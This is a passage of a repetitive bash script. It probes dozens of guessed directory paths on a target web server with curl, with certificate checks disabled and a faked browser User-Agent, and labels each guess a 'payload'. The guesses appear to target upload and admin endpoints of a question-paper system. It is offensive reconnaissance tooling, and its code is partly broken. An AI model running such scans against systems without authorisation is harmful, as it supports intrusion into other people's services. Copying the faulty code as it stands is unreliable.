code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
